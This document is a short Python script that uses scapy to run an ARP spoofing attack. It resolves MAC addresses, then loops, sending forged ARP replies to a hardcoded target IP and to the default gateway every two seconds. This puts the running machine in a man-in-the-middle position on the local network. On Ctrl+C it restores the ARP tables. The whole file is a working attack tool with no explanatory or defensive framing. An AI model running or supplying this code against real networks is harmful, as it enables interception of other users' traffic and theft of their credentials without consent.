from scapy.all import Ether, ARP, srp, send, conf, get_if_addr
import scapy.all as scapy
import time
import ipaddress
import netifaces
import socket

hostname=socket.gethostname()   
local_ip=socket.gethostbyname(hostname) 

def get_network_range():
    self_ip = get_if_addr(conf.iface)
    # Get the subnet mask based on the IP address
    network = ipaddress.ip_interface(self_ip+'/24')
    network_range = set(str(ip) for ip in network.network.hosts())
    # print(network_range)
    return network_range


def get_mac(ip):
	arp_request = scapy.ARP(pdst = ip)
	broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
	arp_request_broadcast = broadcast / arp_request
	answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
	return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
	packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip),
															psrc = spoof_ip)
	scapy.send(packet, verbose = False)


def restore(destination_ip, source_ip):
	destination_mac = get_mac(destination_ip)
	source_mac = get_mac(source_ip)
	packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
	scapy.send(packet, verbose = False)
	




def main():
    
    gateways = netifaces.gateways()
    gateway_ip = gateways['default'][netifaces.AF_INET][0]

    target_ip =  "172.20.10.7"
    
    try:
        sent_packets_count = 0
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_count = sent_packets_count + 2
            print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
            time.sleep(2) # Waits for two seconds

    except KeyboardInterrupt:
        print("\nCtrl + C pressed.............Exiting")
        restore(gateway_ip, target_ip)
        restore(target_ip, gateway_ip)
        print("[+] Arp Spoof Stopped")
main()